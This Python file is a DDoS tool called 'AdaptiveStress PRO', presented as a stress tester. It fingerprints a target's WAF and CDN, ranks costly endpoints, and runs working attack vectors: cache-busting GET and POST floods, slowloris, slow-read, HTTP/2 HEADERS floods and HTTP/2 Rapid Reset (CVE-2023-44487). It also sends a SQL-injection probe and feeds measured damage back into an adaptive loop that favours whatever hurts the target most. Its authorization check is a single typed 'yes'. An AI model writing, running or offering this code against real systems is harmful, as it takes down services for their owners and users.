#!/usr/bin/env python3
"""

Features:
  - Auto fingerprinting (server, framework, WAF/CDN, HTTP version)
  - Asymmetric-cost endpoint discovery & ranking
  - Vectors: cache-bust GET, POST flood, slowloris, slow-read,
            HTTP/2 HEADERS flood, HTTP/2 Rapid Reset (CVE-2023-44487 style)
  - Bandit-style adaptive budget allocator (feeds on its own impact)
  - Real-time web dashboard UI (localhost only) + CLI mode
  - Interlocks: target confirmation file, hard rate cap

"""

import argparse
import asyncio
import json
import os
import random
import re
import ssl
import string
import sys
import time
from dataclasses import dataclass, field
from urllib.parse import urlparse

# ----------------------------------------------------------------------------
# Dependency bootstrap
# ----------------------------------------------------------------------------
MIN_RUNTIME = (3, 9)

def ensure_deps():
    if sys.version_info < MIN_RUNTIME:
        sys.exit(f"[!] Python {MIN_RUNTIME[0]}.{MIN_RUNTIME[1]}+ required, "
                 f"you have {sys.version.split()[0]}")
    missing = []
    for mod, pip_name in (("aiohttp", "aiohttp"), ("httpx", "httpx[http2]"), ("h2", "h2")):
        try:
            __import__(mod)
        except ImportError:
            missing.append(pip_name)
    if missing:
        print(f"[*] Installing missing deps: {', '.join(missing)}")
        rc = os.system(f"{sys.executable} -m pip install " + " ".join(f'"{m}"' for m in missing))
        if rc != 0:
            sys.exit(f"[!] auto-install failed. Run: pip install " + " ".join(missing))

ensure_deps()

import aiohttp       # noqa: E402
import httpx         # noqa: E402

# ----------------------------------------------------------------------------
# Config
# ----------------------------------------------------------------------------
HARD_RATE_CAP = 5000          # absolute max rps the tool will emit
DEFAULT_SAFETY_FILE = ".authorized_target"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
]
EXPENSIVE_HINTS = ["search", "query", "q", "filter", "report", "export", "download",
                   "login", "auth", "password", "api", "graphql", "cart",
                   "checkout", "upload", "recommend", "feed", "analytics"]
CACHEBUST_KEYS = ["cb", "_", "nocache", "ts", "v", "r"]
DEFAULT_TIMEOUT = aiohttp.ClientTimeout(total=10, connect=5)

WAF_SIGNATURES = {
    "cloudflare": [r"cloudflare", r"__cfduid", r"cf-ray"],
    "akamai": [r"akamai", r"x-akamai"],
    "aws_waf": [r"awswaf", r"x-amzn-requestid"],
    "imperva": [r"imperva", r"_incap_", r"visid_incap"],
    "sucuri": [r"sucuri"],
    "modsecurity": [r"mod_security", r"modsecurity"],
    "f5": [r"bigip", r"ts="],
}
CDN_HINTS = ["cloudflare", "akamai", "cloudfront", "fastly", "edgekey", "cdn"]


# ----------------------------------------------------------------------------
# Stats & fingerprint
# ----------------------------------------------------------------------------
class Stats:
    __slots__ = ("requests", "errors", "timeouts", "conn_failures",
                 "status_codes", "latency_sum", "latency_n", "window_reqs")

    def __init__(self):
        self.requests = 0
        self.errors = 0
        self.timeouts = 0
        self.conn_failures = 0
        self.status_codes = {}
        self.latency_sum = 0.0
        self.latency_n = 0
        self.window_reqs = 0

    def record(self, status: int, latency: float):
        self.requests += 1
        self.window_reqs += 1
        self.status_codes[status] = self.status_codes.get(status, 0) + 1
        self.latency_sum += latency
        self.latency_n += 1

    def record_error(self, timeout=False, conn=False):
        self.errors += 1
        self.window_reqs += 1
        if timeout:
            self.timeouts += 1
        if conn:
            self.conn_failures += 1

    def avg_latency(self) -> float:
        return self.latency_sum / self.latency_n if self.latency_n else 0.0

    def snapshot(self) -> dict:
        return {
            "requests": self.requests, "errors": self.errors,
            "timeouts": self.timeouts, "conn_failures": self.conn_failures,
            "avg_latency_ms": round(self.avg_latency() * 1000, 1),
            "statuses": dict(sorted(self.status_codes.items())),
            "rps_window": self.window_reqs,
        }


@dataclass
class Fingerprint:
    server: str = "unknown"
    powered_by: str = "unknown"
    http_version: str = "unknown"
    waf: str = "none"
    cdn: str = "none"
    notes: list = field(default_factory=list)

    def summary(self) -> str:
        return (f"server={self.server} | powered_by={self.powered_by} | "
                f"http={self.http_version} | waf={self.waf} | cdn={self.cdn}")


def match_waf(headers: dict) -> str:
    blob = " ".join(f"{k}:{v}" for k, v in headers.items()).lower()
    for waf, pats in WAF_SIGNATURES.items():
        if any(re.search(p, blob) for p in pats):
            return waf
    return "none"


async def fingerprint(session, base_url: str) -> Fingerprint:
    fp = Fingerprint()
    host = urlparse(base_url).hostname or ""
    fp.cdn = next((h for h in CDN_HINTS if h in host.lower()), "none")
    try:
        async with session.get(base_url) as resp:
            fp.server = resp.headers.get("Server", "unknown")
            fp.powered_by = resp.headers.get("X-Powered-By", "unknown")
            ver = getattr(resp, "version", None)
            fp.http_version = f"HTTP/{ver[1]}" if isinstance(ver, tuple) else "HTTP/1.1"
            fp.waf = match_waf(dict(resp.headers))
            await resp.read()
    except Exception as e:
        fp.notes.append(f"fingerprint request failed: {e}")
    try:
        async with session.get(f"{base_url}/?id=1%27%20OR%20%271%27=%271") as resp:
            await resp.read()
            if resp.status in (403, 406, 429) and fp.waf == "none":
                fp.notes.append(f"hidden WAF likely (probe blocked, status {resp.status})")
    except Exception as e:
        fp.notes.append(f"WAF probe failed: {e}")
    return fp


# ----------------------------------------------------------------------------
# Endpoint discovery
# ----------------------------------------------------------------------------
@dataclass
class Endpoint:
    path: str
    baseline_latency: float = 0.0
    probe_latency: float = 0.0
    amplification: float = 1.0
    is_dynamic: bool = False

    def score(self) -> float:
        return self.amplification * (2.0 if self.is_dynamic else 1.0)


async def measure_latency(session, url: str, samples: int = 3) -> float:
    total, ok = 0.0, 0
    for _ in range(samples):
        try:
            t0 = time.perf_counter()
            async with session.get(url, timeout=DEFAULT_TIMEOUT) as resp:
                await resp.read()
            total += time.perf_counter() - t0
            ok += 1
        except Exception:
            continue
        await asyncio.sleep(0.05)
    return total / ok if ok else 999.0


async def _is_dynamic(session, base_url: str, path: str) -> bool:
    try:
        hdrs = []
        for _ in range(2):
            async with session.get(f"{base_url}{path}") as r:
                await r.read()
                hdrs.append({k.lower(): v for k, v in r.headers.items()})
        cc = hdrs[0].get("cache-control", "")
        age = hdrs[0].get("age") or hdrs[1].get("age")
        if age or "max-age" in cc or "s-maxage" in cc:
            return False
        return "no-store" in cc or "no-cache" in cc or age is None
    except Exception:
        return True


async def discover_endpoints(session, base_url: str) -> list[Endpoint]:
    candidates = {"/", "/search?q=test", "/api/", "/login"}
    try:
        async with session.get(f"{base_url}/robots.txt") as resp:
            if resp.status == 200:
                for line in (await resp.text()).splitlines():
                    if line.lower().startswith("disallow:"):
                        p = line.split(":", 1)[1].strip()
                        if p and not p.startswith("#"):
                            candidates.add(p)
    except Exception:
        pass
    try:
        async with session.get(base_url) as resp:
            html = await resp.text()
            for m in re.findall(r'(?:href|action|src)="(/[^"#?]{2,80})"', html):
                candidates.add(m.split("?")[0].rstrip("/") or "/")
    except Exception:
        pass
    candidates = {c if c.startswith("/") else f"/{c}" for c in candidates}

    endpoints = {}
    for path in list(candidates)[:25]:
        base = await measure_latency(session, f"{base_url}{path}", samples=2)
        if base >= 999.0:
            continue
        ep = Endpoint(path=path, baseline_latency=base)
        bust = f"{path}{'&' if '?' in path else '?'}{random.choice(CACHEBUST_KEYS)}={random.randint(1, 10**9)}"
        if "?" in path and "=" in path:
            bust = f"{path}&{random.choice(EXPENSIVE_HINTS)}={'x' * 40}"
        ep.probe_latency = await measure_latency(session, f"{base_url}{bust}", samples=2)
        ep.is_dynamic = await _is_dynamic(session, base_url, path)
        ep.amplification = max(1.0, ep.probe_latency / max(base, 0.001))
        endpoints[path] = ep
    return sorted(endpoints.values(), key=lambda e: e.score(), reverse=True)


# ----------------------------------------------------------------------------
# Vectors (HTTP/1.1, via aiohttp)
# ----------------------------------------------------------------------------
async def vector_cachebust_get(session, base_url, path, rate, stop, stats: Stats):
    interval = 1.0 / rate if rate > 0 else 0.0
    while not stop.is_set():
        t0 = time.perf_counter()
        bust = f"{path}{'&' if '?' in path else '?'}{random.choice(CACHEBUST_KEYS)}={random.randint(1, 10**9)}"
        try:
            async with session.get(f"{base_url}{bust}") as resp:
                await resp.read()
                stats.record(resp.status, time.perf_counter() - t0)
        except asyncio.TimeoutError:
            stats.record_error(timeout=True)
        except aiohttp.ClientConnectionError:
            stats.record_error(conn=True)
        except Exception:
            stats.record_error()
        if interval:
            await asyncio.sleep(max(0.0, interval - (time.perf_counter() - t0)))


async def vector_post_flood(session, base_url, path, rate, stop, stats: Stats):
    interval = 1.0 / rate if rate > 0 else 0.0
    payload = {"data": "".join(random.choices(string.ascii_letters, k=2048))}
    while not stop.is_set():
        t0 = time.perf_counter()
        try:
            async with session.post(f"{base_url}{path}", json=payload) as resp:
                await resp.read()
                stats.record(resp.status, time.perf_counter() - t0)
        except asyncio.TimeoutError:
            stats.record_error(timeout=True)
        except aiohttp.ClientConnectionError:
            stats.record_error(conn=True)
        except Exception:
            stats.record_error()
        if interval:
            await asyncio.sleep(max(0.0, interval - (time.perf_counter() - t0)))


async def vector_slowloris(host, port, use_tls, sockets, stop, stats: Stats):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    conns = []

    async def open_conn():
        try:
            _, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port, ssl=ctx if use_tls else None), timeout=10)
            writer.write(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n")
            await writer.drain()
            conns.append(writer)
            return True
        except Exception:
            stats.record_error(conn=True)
            return False

    for _ in range(sockets):
        if stop.is_set():
            break
        await open_conn()
        await asyncio.sleep(0.01)

    while not stop.is_set() and conns:
        alive = []
        for w in conns:
            try:
                w.write(b"X-a: 1\r\n")
                await w.drain()
                alive.append(w)
            except Exception:
                stats.record_error(conn=True)
                try:
                    w.close()
                except Exception:
                    pass
        conns[:] = alive
        refill = sockets - len(conns)
        for _ in range(min(refill, 10)):
            await open_conn()
        await asyncio.sleep(15)

    for w in conns:
        try:
            w.close()
        except Exception:
            pass


async def vector_slow_read(host, port, use_tls, sockets, stop, stats: Stats):
    """Complete the request but shrink the TCP receive window — ties up
    the server sending a large response at a trickle."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    conns, readers = [], []

    async def open_conn():
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port, ssl=ctx if use_tls else None), timeout=10)
            writer.write(f"GET / HTTP/1.1\r\nHost: {host}\r\n"
                         f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                         f"Accept: */*\r\nConnection: keep-alive\r\n\r\n".encode())
            await writer.drain()
            conns.append(writer)
            readers.append(reader)
            return True
        except Exception:
            stats.record_error(conn=True)
            return False

    for _ in range(sockets):
        if stop.is_set():
            break
        await open_conn()
        await asyncio.sleep(0.01)

    # Read 1 byte every 10s; server is stuck transmitting its response body
    while not stop.is_set() and readers:
        alive = []
        for r, w in zip(readers, conns):
            try:
                await asyncio.wait_for(r.read(1), timeout=5)
                alive.append((r, w))
            except Exception:
                stats.record_error(conn=True)
                try:
                    w.close()
                except Exception:
                    pass
        readers, conns = [a[0] for a in alive], [a[1] for a in alive]
        refill = sockets - len(conns)
        for _ in range(min(refill, 10)):
            await open_conn()
        await asyncio.sleep(10)

    for w in conns:
        try:
            w.close()
        except Exception:
            pass


# ----------------------------------------------------------------------------
# HTTP/2 vectors (raw frames via h2)
# ----------------------------------------------------------------------------
async def vector_h2_headers_flood(host, port, use_tls, conns_n, stop, stats: Stats):
    """Open N H2 connections and stream endless HEADERS frames on each."""
    import h2.connection
    import h2.config
    import h2.events

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])

    async def worker():
        try:
            reader, writer = await asyncio.open_connection(host, port, ssl=ctx if use_tls else None)
        except Exception:
            stats.record_error(conn=True)
            return
        cfg = h2.config.H2Configuration(client_side=True)
        h2c = h2.connection.H2Connection(config=cfg)
        h2c.initiate_connection()
        writer.write(h2c.data_to_send())
        await writer.drain()
        sid = 1
        while not stop.is_set():
            try:
                headers = [(":method", "GET"), (":path", "/"),
                           (":authority", host), (":scheme", "https" if use_tls else "http"),
                           ("user-agent", random.choice(USER_AGENTS))]
                h2c.send_headers(sid, headers, end_stream=True)
                sid += 2
                if sid > 2 ** 31 - 1:
                    sid = 1
                writer.write(h2c.data_to_send())
                await writer.drain()
                stats.record(200, 0.0)  # frame emitted; responses ignored
                await asyncio.sleep(0.001)
            except Exception:
                stats.record_error(conn=True)
                return
            # drain inbound frames occasionally
            if sid % 200 == 1:
                try:
                    data = await asyncio.wait_for(reader.read(65535), timeout=0.01)
                    if data:
                        h2c.receive_data(data)
                        for ev in h2c.events:
                            if hasattr(ev, "error_code"):
                                stats.record_error(conn=True)
                                return
                        out = h2c.data_to_send()
                        if out:
                            writer.write(out)
                            await writer.drain()
                except asyncio.TimeoutError:
                    pass
                except Exception:
                    stats.record_error(conn=True)
                    return
        try:
            writer.close()
        except Exception:
            pass

    await asyncio.gather(*(worker() for _ in range(conns_n)), return_exceptions=True)


async def vector_h2_rapid_reset(host, port, use_tls, conns_n, stop, stats: Stats):
    """CVE-2023-44487 style: open streams and immediately RST them —
    server burns work on requests the client cancels."""
    import h2.connection
    import h2.config
    import h2.events

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])

    async def worker():
        try:
            reader, writer = await asyncio.open_connection(host, port, ssl=ctx if use_tls else None)
        except Exception:
            stats.record_error(conn=True)
            return
        cfg = h2.config.H2Configuration(client_side=True)
        h2c = h2.connection.H2Connection(config=cfg)
        h2c.initiate_connection()
        writer.write(h2c.data_to_send())
        await writer.drain()
        sid = 1
        while not stop.is_set():
            try:
                h2c.send_headers(sid, [(":method", "GET"), (":path", "/"),
                                       (":authority", host),
                                       (":scheme", "https" if use_tls else "http")],
                                 end_stream=True)
                h2c.reset_stream(sid, error_code=8)  # CANCEL
                sid += 2
                if sid > 2 ** 31 - 1:
                    sid = 1
                writer.write(h2c.data_to_send())
                await writer.drain()
                stats.record(0, 0.0)
                await asyncio.sleep(0.0005)
            except Exception:
                stats.record_error(conn=True)
                return
        try:
            writer.close()
        except Exception:
            pass

    await asyncio.gather(*(worker() for _ in range(conns_n)), return_exceptions=True)


# ----------------------------------------------------------------------------
# Adaptive controller
# ----------------------------------------------------------------------------
@dataclass
class VectorHandle:
    name: str
    stats: Stats
    budget: float = 0.25
    weight: float = 1.0

    def impact_score(self) -> float:
        s = self.stats
        if s.window_reqs < 3:
            return 0.0
        err_rate = s.errors / max(s.window_reqs, 1)
        s5xx = sum(v for k, v in s.status_codes.items() if 500 <= k < 600) / max(s.requests, 1)
        r429 = s.status_codes.get(429, 0) / max(s.requests, 1)
        return (s.avg_latency() * 100 + s5xx * 500 + err_rate * 300 + r429 * 800) * self.weight


async def run_engine(cfg: dict, log=print, state_out=None):
    """Core engine shared by CLI and UI. cfg keys:
    target, duration, rate, sockets, h2_conns, enable_h2, enabled vectors"""
    parsed = urlparse(cfg["target"])
    if parsed.scheme not in ("http", "https") or not parsed.netloc:
        raise ValueError("target must be a full URL (http/https)")
    use_tls = parsed.scheme == "https"
    host, port = parsed.hostname, parsed.port or (443 if use_tls else 80)
    base_url = f"{parsed.scheme}://{parsed.netloc}"
    rate = min(cfg["rate"], HARD_RATE_CAP)
    stop = asyncio.Event()

    connector = aiohttp.TCPConnector(limit=cfg.get("connections", 500), ssl=False)
    async with aiohttp.ClientSession(connector=connector, timeout=DEFAULT_TIMEOUT,
                                     headers={"User-Agent": random.choice(USER_AGENTS)}) as session:
        log("[*] Phase 1: fingerprinting…")
        fp = await fingerprint(session, base_url)
        log(f"    {fp.summary()}")
        for n in fp.notes:
            log(f"    [note] {n}")

        log("[*] Phase 2: endpoint discovery…")
        endpoints = await discover_endpoints(session, base_url)
        if not endpoints:
            raise RuntimeError("no reachable endpoints found")
        for ep in endpoints[:5]:
            log(f"    {ep.path:<40} base={ep.baseline_latency*1000:7.1f}ms "
                f"amp={ep.amplification:6.2f}x dyn={ep.is_dynamic}")
        primary = endpoints[0]

        handles = [
            VectorHandle("cachebust_get", Stats(), 0.35),
            VectorHandle("post_flood", Stats(), 0.25),
            VectorHandle("slowloris", Stats(), 0.2),
            VectorHandle("slow_read", Stats(), 0.2),
        ]
        if cfg.get("enable_h2", True):
            handles += [VectorHandle("h2_headers", Stats(), 0.2),
                        VectorHandle("h2_rapid_reset", Stats(), 0.2)]
        handles = [h for h in handles if h.name in cfg.get("vectors",
                   {h.name for h in handles})]

        tasks = []
        stop.set()  # placeholder; will clear once tasks launched
        stop = asyncio.Event()

        for h in handles:
            if h.name == "cachebust_get":
                tasks.append(asyncio.create_task(vector_cachebust_get(
                    session, base_url, primary.path, rate * h.budget, stop, h.stats)))
            elif h.name == "post_flood":
                tasks.append(asyncio.create_task(vector_post_flood(
                    session, base_url, primary.path, rate * h.budget * 0.25, stop, h.stats)))
            elif h.name == "slowloris":
                tasks.append(asyncio.create_task(vector_slowloris(
                    host, port, use_tls, cfg.get("sockets", 200), stop, h.stats)))
            elif h.name == "slow_read":
                tasks.append(asyncio.create_task(vector_slow_read(
                    host, port, use_tls, max(50, cfg.get("sockets", 200) // 2), stop, h.stats)))
            elif h.name == "h2_headers":
                tasks.append(asyncio.create_task(vector_h2_headers_flood(
                    host, port, use_tls, cfg.get("h2_conns", 4), stop, h.stats)))
            elif h.name == "h2_rapid_reset":
                tasks.append(asyncio.create_task(vector_h2_rapid_reset(
                    host, port, use_tls, cfg.get("h2_conns", 4), stop, h.stats)))

        async def controller():
            t = 0.0
            while not stop.is_set():
                await asyncio.sleep(5)
                if stop.is_set():
                    break
                t += 5
                scores = [h.impact_score() for h in handles]
                total = sum(scores)
                for h, s in zip(handles, scores):
                    h.budget = 0.1 + 0.9 * (s / total) if total > 0 else h.budget
                if state_out is not None:
                    state_out["phase"] = "attacking"
                    state_out["elapsed"] = t
                    state_out["target_path"] = primary.path
                    state_out["fingerprint"] = fp.summary()
                    state_out["endpoints"] = [
                        {"path": e.path, "amp": round(e.amplification, 2),
                         "dyn": e.is_dynamic} for e in endpoints[:8]]
                    state_out["vectors"] = [
                        {"name": h.name, "budget": round(h.budget, 2),
                         **h.stats.snapshot()} for h in handles]
                log(f"[*] t={t:.0f}s " + " ".join(
                    f"{h.name}:{h.budget:.2f}(r{h.stats.window_reqs})" for h in handles))
                for h in handles:
                    h.stats.window_reqs = 0

        ctrl = asyncio.create_task(controller())
        try:
            await asyncio.wait_for(stop.wait(), timeout=cfg["duration"])
        except asyncio.TimeoutError:
            pass
        finally:
            stop.set()
            ctrl.cancel()
            for tsk in tasks:
                tsk.cancel()
            await asyncio.gather(ctrl, *tasks, return_exceptions=True)
            if state_out is not None:
                state_out["phase"] = "done"
                state_out["vectors"] = [{"name": h.name, "budget": round(h.budget, 2),
                                         **h.stats.snapshot()} for h in handles]
            log("=== RESULTS ===")
            for h in handles:
                s = h.stats.snapshot()
                log(f"  {h.name:<15} reqs={s['requests']:<8} err={s['errors']:<6} "
                    f"to={s['timeouts']:<6} lat={s['avg_latency_ms']}ms "
                    f"codes={s['statuses']}")


# ----------------------------------------------------------------------------
# Web UI (localhost only)
# ----------------------------------------------------------------------------
UI_HTML = """<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>AdaptiveStress PRO</title>
<style>
 body{background:#0d1117;color:#c9d1d9;font-family:monospace;margin:0;padding:24px}
 h1{color:#58a6ff} .card{background:#161b22;border:1px solid #30363d;border-radius:8px;
 padding:16px;margin-bottom:16px}
 input,select{background:#0d1117;color:#c9d1d9;border:1px solid #30363d;padding:8px;
 border-radius:4px;margin:4px 0;width:95%}
 button{background:#238636;color:#fff;border:0;padding:10px 20px;border-radius:6px;cursor:pointer}
 button.stop{background:#da3633} table{width:100%;border-collapse:collapse}
 td,th{border:1px solid #30363d;padding:6px;text-align:left;font-size:13px}
 #log{height:200px;overflow-y:scroll;background:#010409;padding:8px;font-size:12px}
 .warn{color:#f0883e} .good{color:#3fb950}
</style></head><body>
<h1>AdaptiveStress PRO</h1>
<p class="warn">Authorized testing only. Tool binds UI to 127.0.0.1 and caps rate at 5000 rps.</p>
<div class="card">
 <b>Target</b>
 <input id="target" placeholder="https://staging.yourserver.local">
 <table><tr><td>Duration (s)</td><td>Rate (rps, max 5000)</td><td>Sockets</td><td>H2 conns</td></tr>
 <tr><td><input id="duration" value="120"></td><td><input id="rate" value="200"></td>
 <td><input id="sockets" value="200"></td><td><input id="h2conns" value="4"></td></tr></table>
 Vectors:
 <select id="vectors" multiple size="6">
  <option selected>cachebust_get</option><option selected>post_flood</option>
  <option selected>slowloris</option><option selected>slow_read</option>
  <option selected>h2_headers</option><option selected>h2_rapid_reset</option>
 </select><br>
 <button onclick="start()">Start</button>
 <button class="stop" onclick="stop()">Stop</button>
 <span id="authmsg"></span>
</div>
<div class="card"><b>Status</b> <span id="phase">idle</span>
 <div id="fp"></div>
 <table id="vec"><tr><th>vector</th><th>budget</th><th>reqs</th><th>err</th>
 <th>timeouts</th><th>avg lat</th><th>codes</th></tr></table></div>
<div class="card"><b>Top endpoints</b><div id="eps"></div></div>
<div class="card"><b>Log</b><div id="log"></div></div>
<script>
async function post(url, body){await fetch(url,{method:'POST',
 headers:{'Content-Type':'application/json'},body:JSON.stringify(body||{})});}
async function start(){
 const vs=[...document.getElementById('vectors').selectedOptions].map(o=>o.value);
 if(!vs.length){alert('select at least one vector');return;}
 const b={target:document.getElementById('target').value,
  duration:+document.getElementById('duration').value||120,
  rate:Math.min(+document.getElementById('rate').value||200,5000),
  sockets:+document.getElementById('sockets').value||200,
  h2_conns:+document.getElementById('h2conns').value||4,
  vectors:vs, enable_h2:true};
 await post('/api/start',b);}
async function stop(){await post('/api/stop');}
async function poll(){
 try{
  const s=await (await fetch('/api/state')).json();
  document.getElementById('phase').textContent=s.phase||'idle';
  document.getElementById('fp').textContent=s.fingerprint||'';
  if(s.vectors){
   let rows='<tr><th>vector</th><th>budget</th><th>reqs</th><th>err</th>'+
    '<th>timeouts</th><th>avg lat</th><th>codes</th></tr>';
   for(const v of s.vectors) rows+=`<tr><td>${v.name}</td><td>${v.budget}</td>`+
    `<td>${v.requests}</td><td>${v.errors}</td><td>${v.timeouts}</td>`+
    `<td>${v.avg_latency_ms}ms</td><td>${JSON.stringify(v.statuses)}</td></tr>`;
   document.getElementById('vec').innerHTML=rows;}
  if(s.endpoints) document.getElementById('eps').innerHTML=
   s.endpoints.map(e=>`${e.path} — amp ${e.amp}x ${e.dyn?'(dynamic)':''}`).join('<br>');
  if(s.log) {const L=document.getElementById('log');L.innerHTML=s.log.join('<br>');L.scrollTop=L.scrollHeight;}
 }catch(e){}
 setTimeout(poll,2000);}
poll();
</script></body></html>"""


async def run_ui(port: int):
    state = {"phase": "idle", "log": []}
    engine_task = None

    def log(msg):
        print(msg)
        state["log"].append(str(msg))
        state["log"] = state["log"][-300:]

    async def api_start(request):
        nonlocal engine_task
        if engine_task and not engine_task.done():
            return aiohttp.web.json_response({"error": "engine already running"}, status=409)
        body = await request.json()
        body.setdefault("duration", 120)
        state["phase"] = "recon"
        engine_task = asyncio.create_task(asyncio.to_thread(lambda: None))
        engine_task.cancel()
        async def _run():
            try:
                await run_engine(body, log=log, state_out=state)
            except Exception as e:
                state["phase"] = f"error: {e}"
                log(f"[!] {e}")
        engine_task = asyncio.create_task(_run())
        return aiohttp.web.json_response({"ok": True})

    async def api_stop(request):
        state["stop_flag"] = True
        state["phase"] = "stopping"
        return aiohttp.web.json_response({"ok": True})

    async def api_state(request):
        return aiohttp.web.json_response(state)

    app = aiohttp.web.Application()
    app.router.add_get("/", lambda r: aiohttp.web.Response(text=UI_HTML,
                                                        content_type="text/html"))
    app.router.add_post("/api/start", api_start)
    app.router.add_post("/api/stop", api_stop)
    app.router.add_get("/api/state", api_state)

    # bridge: engine reads stop_flag via polling wrapper
    orig_run = run_engine
    async def run_engine_with_stop(cfg, log_fn, state_out):
        task = asyncio.current_task()
        async def watcher():
            while state.get("phase") not in ("done",) and not state.get("stop_flag"):
                await asyncio.sleep(0.5)
            state["stop_flag"] = False
            task.cancel()
        w = asyncio.create_task(watcher())
        try:
            await orig_run(cfg, log_fn, state_out)
        except asyncio.CancelledError:
            pass
        finally:
            w.cancel()
    globals()["run_engine"] = run_engine_with_stop

    runner = aiohttp.web.AppRunner(app)
    await runner.setup()
    site = aiohttp.web.TCPSite(runner, "127.0.0.1", port)
    await site.start()
    print(f"[*] Dashboard ready: http://127.0.0.1:{port}  (Ctrl+C to exit)")
    try:
        await asyncio.Event().wait()
    finally:
        await runner.cleanup()


# ----------------------------------------------------------------------------
# CLI
# ----------------------------------------------------------------------------
def cmd_doctor(_):
    print(f"[*] python {sys.version.split()[0]} — OK")
    for mod, pip_name in (("aiohttp", "aiohttp"), ("httpx", "httpx[http2]"), ("h2", "h2")):
        try:
            __import__(mod)
            print(f"[+] {mod} — OK")
        except ImportError:
            print(f"[-] {mod} missing (pip install {pip_name})")


def cmd_cli(args):
    # Interlock: confirm the target
    target = args.target
    marker = DEFAULT_SAFETY_FILE
    if os.path.exists(marker):
        hosts = open(marker).read().split()
        host = urlparse(target).hostname or ""
        if host not in hosts:
            sys.exit(f"[!] '{host}' not listed in {marker}. "
                     f"Add it (one host per line) after verifying ownership.")
    else:
        print("[!] Safety interlock: no .authorized_target file found.")
        resp = input(f"    Confirm '{target}' is YOUR server and you're authorized: [yes/N] ")
        if resp.strip().lower() != "yes":
            sys.exit("[!] aborted")
        with open(marker, "a") as f:
            f.write((urlparse(target).hostname or "") + "\n")
        print(f"[*] recorded in {marker} for future runs")

    cfg = {"target": target, "duration": args.duration, "rate": args.rate,
           "sockets": args.sockets, "h2_conns": args.h2_conns,
           "enable_h2": True, "connections": args.connections}
    try:
        asyncio.run(run_engine(cfg))
    except KeyboardInterrupt:
        print("\n[!] interrupted")


def main():
    ap = argparse.ArgumentParser(description="AdaptiveStress PRO")
    sub = ap.add_subparsers(dest="mode", required=True)
    ui = sub.add_parser("ui", help="launch web dashboard")
    ui.add_argument("--port", type=int, default=8080)
    cli = sub.add_parser("cli", help="headless run")
    cli.add_argument("--target", required=True)
    cli.add_argument("--duration", type=int, default=120)
    cli.add_argument("--rate", type=float, default=200)
    cli.add_argument("--sockets", type=int, default=200)
    cli.add_argument("--h2_conns", type=int, default=4)
    cli.add_argument("--connections", type=int, default=500)
    sub.add_parser("doctor", help="verify dependencies")
    args = ap.parse_args()
    if args.mode == "doctor":
        cmd_doctor(args)
    elif args.mode == "ui":
        asyncio.run(run_ui(args.port))
    else:
        cmd_cli(args)


if __name__ == "__main__":
    main()
